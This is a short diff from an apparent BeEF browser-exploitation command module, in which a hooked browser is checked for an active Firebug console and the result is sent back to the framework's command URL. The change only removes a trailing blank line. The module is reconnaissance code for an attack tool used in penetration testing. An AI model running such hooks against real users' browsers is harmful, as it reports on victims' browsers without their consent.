@@ -9,4 +9,3 @@ beef.execute(function() {
 	if (window.console && (window.console.firebug || window.console.exception)) result = "Enabled and in use!";
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "firebug="+result);
 });
-
